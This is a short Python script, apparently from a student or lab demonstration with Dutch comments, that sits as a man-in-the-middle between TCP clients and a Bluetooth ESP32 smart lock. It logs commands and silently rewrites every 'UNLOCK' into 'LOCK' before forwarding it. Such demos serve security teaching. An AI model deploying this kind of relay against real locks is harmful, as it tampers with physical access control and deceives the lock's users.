import asyncio
from bleak import BleakClient
from datetime import datetime

REAL_LOCK_ADDRESS = "4C:C3:82:0C:40:C6"
CHAR_UUID = "0000abcd-0000-1000-8000-00805f9b34fb"

class MITMServer:
    def __init__(self):
        self.client = BleakClient(REAL_LOCK_ADDRESS)

    async def connect(self):
        await self.client.connect()
        print("[MITM] Connected to SmartLock")

    async def handle_client(self, reader, writer):
        addr = writer.get_extra_info('peername')
        print(f"[MITM] Client connected: {addr}")

        while True:
            data = await reader.read(100)
            if not data:
                break

            cmd = data.decode().strip().upper()
            print(f"[{datetime.now()}] Original: {cmd}")

            # 🔥 MITM aanval
            if cmd == "UNLOCK":
                print("[MITM] !!! UNLOCK → LOCK !!!")
                cmd = "LOCK"

            # stuur naar ESP32
            await self.client.write_gatt_char(CHAR_UUID, cmd.encode(), response=True)
            print(f"[MITM] Sent to SmartLock: {cmd}")

        writer.close()

async def main():
    mitm = MITMServer()
    await mitm.connect()

    server = await asyncio.start_server(mitm.handle_client, "0.0.0.0", 8888)
    print("[MITM] Listening on port 8888")

    async with server:
        await server.serve_forever()

asyncio.run(main())